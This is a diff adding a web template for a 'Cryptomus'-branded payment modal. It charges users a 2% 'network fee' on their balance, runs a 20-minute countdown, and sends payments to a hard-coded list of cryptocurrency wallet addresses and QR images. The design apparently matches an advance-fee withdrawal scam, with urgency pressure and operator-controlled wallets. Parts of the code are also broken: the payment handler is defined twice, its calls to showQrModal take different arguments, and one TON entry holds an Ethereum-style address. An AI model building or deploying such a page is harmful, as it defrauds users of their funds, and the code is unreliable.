@@ -1,0 +1,433 @@
+<div id="formModal" class="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm hidden">
+
+<input type="hidden" id="userBalance" value="<%= user.usdBalance %>">
+
+
+    <div class="w-[90%] max-w-md rounded-2xl bg-white p-7 shadow-2xl relative transform transition-all duration-300">
+
+        <div class=" mb-6">
+            <div class="flex justify-between items-center gap-3">
+                <div class="flex items-center gap-3">
+                    <div class="h-10 w-10 flex items-center justify-center rounded-lg bg-white border">
+                        <img src="https://i.postimg.cc/PfSypXt7/Cryptomus-logo.png" alt="Cryptomus"
+                            class="h-10 w-10 object-contain" />
+                    </div>
+                    <h2 class="text-xl font-extrabold text-[#000]">
+                        Cryptomus
+                    </h2>
+                </div>
+
+                <button onclick="closeFormModal()"
+                    class="text-gray-400 hover:text-gray-700 transition p-1 rounded-full hover:bg-gray-100">
+                    ✕
+                </button>
+            </div>
+        </div>
+
+        <div class="space-y-3 rounded-xl bg-blue-50 p-5 text-base border border-blue-200 mb-6">
+            <div class="flex justify-between">
+                <span class="font-medium text-gray-600">Network Fee</span>
+                <span class="font-extrabold text-lg text-gray-800">
+                    $<%= (user.usdBalance * 0.02).toFixed(2) %>
+                </span>
+            </div>
+            <p class="text-xs text-gray-500">
+                This fee is required to process your transaction securely.
+            </p>
+        </div>
+
+        <div class="mb-6">
+            <div class="flex justify-between text-sm text-gray-600 mb-2">
+                <span>Expiration time</span>
+                <span id="countdown" class="font-bold text-blue-600">20:00</span>
+            </div>
+            <div class="w-full bg-gray-200 rounded-full h-2.5">
+                <div id="progressBar" class="bg-blue-500 h-2.5 rounded-full transition-all duration-1000"
+                    style="width: 100%"></div>
+            </div>
+        </div>
+
+        <div class="mb-4">
+            <label for="currencySelect" class="block text-sm font-bold text-gray-700 mb-1">
+                Select currency
+            </label>
+            <select id="currencySelect" onchange="updateNetworkOptions()"
+    class="w-full rounded-xl border border-gray-300 p-3
+           bg-white text-gray-800
+           focus:ring-2 focus:ring-[#2786ff] focus:border-[#2786ff]">
+</select>
+
+        </div>
+
+        <div class="mb-8">
+            <label for="networkSelect" class="block text-sm font-bold text-gray-700 mb-1">
+                Select network
+            </label>
+            <select id="networkSelect"
+    class="w-full rounded-xl border border-gray-300 p-3
+           bg-white text-gray-800
+           focus:ring-2 focus:ring-[#2786ff] focus:border-[#2786ff]">
+</select>
+
+        </div>
+
+        <button onclick="proceedToPayment()"
+            class="w-full rounded-xl bg-gradient-to-r from-[#1a6fff] to-[#3bd3a8] py-3.5 font-extrabold text-white text-lg shadow-xl hover:opacity-95 transition transform hover:-translate-y-0.5">
+            Proceed to Payment
+        </button>
+
+    </div>
+</div>
+
+<!-- Include the complete-payment-modal -->
+<%- include('complete-payment-modal') %>
+
+
+<style>
+.ts-control {
+    border-radius: 0.75rem;
+    padding: 0.75rem;
+    border-color: #d1d5db;
+}
+.ts-control:focus {
+    border-color: #2786ff;
+}
+.ts-dropdown {
+    border-radius: 0.75rem;
+}
+</style>
+
+
+
+
+
+<script>
+    // --- 1. WALLET DATA SETUP ---
+    // Maps Currency-Network to the wallet address and a placeholder for the QR code URL
+    // Make WALLETS globally available
+    window.WALLETS = {
+        'BNB SMART CHAIN': {
+            'BNB Smart Chain (BEP20)': {
+                address: '0x34C10d764ff7EFfcA006AEB6889f42Ad052b5cAb',
+                qr: 'https://i.postimg.cc/1zn4pB0X/BMB-crop-2025-12-17-09-45-09.jpg'
+            }
+        },
+        'BCH': {
+            'Bitcoin Cash': {
+                address: 'qp6q7r0lrepkdq047704469wpjeqc9ww9vqnqszrwe',
+                qr: 'https://i.postimg.cc/FRCc9zxP/BCH-crop-2025-12-17-09-41-11.jpg'
+            }
+        },
+        'TRX': {
+            'TRON': {
+                address: 'TS9YeXnsFysNB4DL565Z3yhNQp5ebd3Uyp',
+                qr: 'https://i.postimg.cc/4yFrb6Qk/trx.jpg'
+            }
+        },
+        'DASH': {
+            'Dash': {
+                address: 'XgnVtTKjmTxNWuXnoUVQNGMUiU1S2JH3K8',
+                qr: 'https://i.postimg.cc/bJwCCGJq/DASH.jpg'
+            }
+        },
+        'DOGE': {
+            'Dogecoin': {
+                address: 'DBpfwnFouGm3PdhsEp1jL9W25NF52qCjHs',
+                qr: 'https://i.postimg.cc/nMb1JMH4/doge.jpg'
+            }
+        },
+        'USDT': {
+            'TON': {
+                address: 'UQBFfrHQvxs4PJHlqpEqEd_H6wzioY-rkFaQDW2YsQCe3Ptf',
+                qr: 'https://i.postimg.cc/PJtwzZrK/ton.jpg'
+            },
+            'Solana': {
+                address: '5sTX3otNSYgrsUwGunZZWEvvuYAS2myXLDPA1PqVwrMK',
+                qr: 'https://i.postimg.cc/02zQgZ3T/sol.jpg'
+            },
+            'Ethereum (ERC20)': {
+                address: '0x34C10d764ff7EFfcA006AEB6889f42Ad052b5cAb',
+                qr: 'https://i.postimg.cc/yxMzChgh/eth.jpg'
+            },
+            'TRON (TRC20)': {
+                address: 'TS9YeXnsFysNB4DL565Z3yhNQp5ebd3Uyp',
+                qr: 'https://i.postimg.cc/8Pd1g340/tron.jpg'
+            },
+            'BNB Smart Chain (BEP20)': {
+                address: '0x34C10d764ff7EFfcA006AEB6889f42Ad052b5cAb',
+                qr: 'https://i.postimg.cc/mZY3zYSk/USDC-BNB.jpg'
+            }
+        },
+        'USDC': {
+            'Ethereum (ERC20)': {
+                address: '0x34C10d764ff7EFfcA006AEB6889f42Ad052b5cAb',
+                qr: 'https://i.postimg.cc/1Rvtj4mV/USDC-ETH.jpg'
+            },
+            'TON': {
+                address: '0x34C10d764ff7EFfcA006AEB6889f42Ad052b5cAb',
+                qr: 'https://i.postimg.cc/TwHKmsFG/ETH.jpg'
+            },
+            'Solana': {
+                address: '5sTX3otNSYgrsUwGunZZWEvvuYAS2myXLDPA1PqVwrMK',
+                qr: 'https://i.postimg.cc/QxczMKFS/SOLANA-USDC.jpg'
+            }
+        },
+        'ETH': {
+            'Ethereum': {
+                address: '0x34C10d764ff7EFfcA006AEB6889f42Ad052b5cAb',
+                qr: 'https://i.postimg.cc/TwHKmsFG/ETH.jpg'
+            }
+        },
+        'BTC': {
+            'Bitcoin': {
+                address: 'bc1qavrnl4ah6202xwrvhe772qkfxl0cgjlremgph0',
+                qr: 'https://i.postimg.cc/VsrBfyJq/Whats-App-Image-2025-12-16-at-8-40-24-PM-(1)-crop-2025-12-17-10-02-59.jpg'
+            }
+        },
+        'SOL': {
+            'Solana': {
+                address: 'sTX3otNSYgrsUwGunZZWEvvuYAS2myXLDPA1PqVwrMK',
+                qr: 'https://i.postimg.cc/43jyw0sB/SOLANA.jpg'
+            }
+        },
+        'POL': {
+            'Polygon': {
+                address: '0x34C10d764ff7EFfcA006AEB6889f42Ad052b5cAb',
+                qr: 'https://i.postimg.cc/9XbVQksX/POLYGON.jpg'
+            }
+        },
+        'TON': {
+            'TON': {
+                address: 'UQBFfrHQvxs4PJHlqpEqEd_H6wzioY-rkFaQDW2YsQCe3Ptf',
+                qr: 'https://i.postimg.cc/g0HtHCVL/TON.jpg'
+            }
+        }
+    };
+
+    // --- 2. INITIALIZATION AND DROPDOWN LOGIC ---
+    document.addEventListener('DOMContentLoaded', () => {
+        populateCurrencyOptions();
+        updateNetworkOptions(); // Initialize network options based on the first currency
+    });
+
+    // Populate the 'Select currency' dropdown
+    function populateCurrencyOptions() {
+        const currencySelect = document.getElementById('currencySelect');
+        currencySelect.innerHTML = ''; // Clear existing options
+
+        // Use Object.keys to get the primary currencies (e.g., 'USDT', 'BTC')
+        Object.keys(WALLETS).forEach(currency => {
+            const option = document.createElement('option');
+            // The display name can be adjusted here if you want it more verbose
+            let displayName = currency;
+            if (currency === 'BNB SMART CHAIN') displayName = 'BNB Smart Chain';
+
+            option.value = currency;
+            option.textContent = displayName;
+            currencySelect.appendChild(option);
+        });
+    }
+
+    // Populate the 'Select network' dropdown based on the selected currency
+    function updateNetworkOptions() {
+        const currencySelect = document.getElementById('currencySelect');
+        const networkSelect = document.getElementById('networkSelect');
+
+        const selectedCurrency = currencySelect.value;
+        const networks = WALLETS[selectedCurrency];
+
+        networkSelect.innerHTML = ''; // Clear existing options
+
+        if (networks) {
+            // Use Object.keys to get the available networks for the currency
+            Object.keys(networks).forEach(networkName => {
+                const option = document.createElement('option');
+                option.value = networkName;
+                option.textContent = networkName;
+                networkSelect.appendChild(option);
+            });
+        }
+    }
+
+    // --- 3. PAYMENT FLOW LOGIC ---
+
+    // Handler for the "Proceed to Payment" button
+    function proceedToPayment() {
+        const currencySelect = document.getElementById('currencySelect');
+        const networkSelect = document.getElementById('networkSelect');
+
+        const selectedCurrency = currencySelect.options[currencySelect.selectedIndex].text.trim();
+        const selectedNetwork = networkSelect.options[networkSelect.selectedIndex].text.trim();
+
+        // Get the user's balance from the hidden input or data attribute
+        const userBalance = parseFloat(document.getElementById('userBalance').value);
+        const amount = (userBalance * 0.98).toFixed(2); // Calculate 98% of the balance
+
+        if (selectedCurrency && selectedNetwork) {
+            // Find the wallet info by matching the currency and network names
+            let walletInfo = null;
+            for (const currency in WALLETS) {
+                if (currency.toUpperCase() === selectedCurrency.toUpperCase()) {
+                    for (const network in WALLETS[currency]) {
+                        if (network.toUpperCase() === selectedNetwork.toUpperCase()) {
+                            walletInfo = WALLETS[currency][network];
+                            break;
+                        }
+                    }
+                    if (walletInfo) break;
+                }
+            }
+
+            if (walletInfo) {
+                // Show the complete payment modal with the wallet info
+                showQrModal(walletInfo.address, walletInfo.qr);
+            } else {
+                console.error('Wallet info not found for:', { selectedCurrency, selectedNetwork });
+                alert('Wallet information not found for the selected combination.');
+            }
+        } else {
+            alert('Please select a currency and network.');
+        }
+    }
+
+    // --- 4. MODAL & UTILITY FUNCTIONS ---
+
+    // Countdown Timer Logic (Original, kept intact)
+    let countdownInterval;
+    let timeLeft = 20 * 60; // 20 minutes in seconds
+
+    function startCountdown() {
+        const countdownElement = document.getElementById('countdown');
+        const progressBar = document.getElementById('progressBar');
+
+        if (countdownInterval) {
+            clearInterval(countdownInterval);
+        }
+
+        timeLeft = 20 * 60;
+        updateCountdownDisplay();
+
+        progressBar.classList.remove('bg-red-500');
+        progressBar.classList.add('bg-blue-500');
+
+        countdownInterval = setInterval(() => {
+            timeLeft--;
+            updateCountdownDisplay();
+
+            const progress = (timeLeft / (20 * 60)) * 100;
+            progressBar.style.width = `${progress}%`;
+
+            if (timeLeft <= 300 && !progressBar.classList.contains('bg-red-500')) {
+                progressBar.classList.remove('bg-blue-500');
+                progressBar.classList.add('bg-red-500');
+            }
+
+            if (timeLeft <= 0) {
+                clearInterval(countdownInterval);
+                closeFormModal();
+            }
+        }, 1000);
+    }
+
+    function updateCountdownDisplay() {
+        const countdownElement = document.getElementById('countdown');
+        const minutes = Math.floor(timeLeft / 60);
+        const seconds = timeLeft % 60;
+        countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+    }
+
+    function openFormModal() {
+        document.getElementById('formModal').classList.remove('hidden');
+        document.body.style.overflow = 'hidden';
+        startCountdown();
+    }
+
+    function closeFormModal() {
+        if (countdownInterval) {
+            clearInterval(countdownInterval);
+        }
+        document.getElementById('formModal').classList.add('hidden');
+        document.body.style.overflow = 'auto';
+    }
+</script>
+
+
+
+<!-- TOM DROP DOWN  -->
+ <script>
+let currencyTom = null;
+let networkTom = null;
+
+document.addEventListener('DOMContentLoaded', () => {
+    initTomSelects();
+});
+
+function initTomSelects() {
+    const currencySelect = document.getElementById('currencySelect');
+    const networkSelect = document.getElementById('networkSelect');
+
+    const currencyOptions = Object.keys(WALLETS).map(currency => ({
+        value: currency,
+        text: currency === 'BNB SMART CHAIN' ? 'BNB Smart Chain' : currency
+    }));
+
+    currencyTom = new TomSelect(currencySelect, {
+        options: currencyOptions,
+        items: [currencyOptions[0].value],
+        placeholder: 'Select currency',
+        onChange(value) {
+            loadNetworkSelect(value);
+        }
+    });
+
+    loadNetworkSelect(currencyOptions[0].value);
+}
+
+function loadNetworkSelect(currency) {
+    const networkSelect = document.getElementById('networkSelect');
+    const networks = WALLETS[currency];
+
+    if (!networks) return;
+
+    if (networkTom) {
+        networkTom.destroy();
+        networkSelect.innerHTML = '';
+    }
+
+    const networkOptions = Object.keys(networks).map(network => ({
+        value: network,
+        text: network
+    }));
+
+    networkTom = new TomSelect(networkSelect, {
+        options: networkOptions,
+        items: [networkOptions[0].value],
+        placeholder: 'Select network'
+    });
+}
+
+/* PAYMENT */
+function proceedToPayment() {
+    if (!currencyTom || !networkTom) {
+        alert('Please select currency and network');
+        return;
+    }
+
+    const selectedCurrency = currencyTom.getValue();
+    const selectedNetwork = networkTom.getValue();
+
+    const userBalance = parseFloat(
+        document.getElementById('userBalance').value
+    );
+
+    const amount = (userBalance * 0.98).toFixed(2);
+    const walletInfo = WALLETS[selectedCurrency][selectedNetwork];
+
+    if (!walletInfo) {
+        alert('Wallet not found');
+        return;
+    }
+
+    showQrModal(amount, walletInfo.address, walletInfo.qr);
+}
+</script>
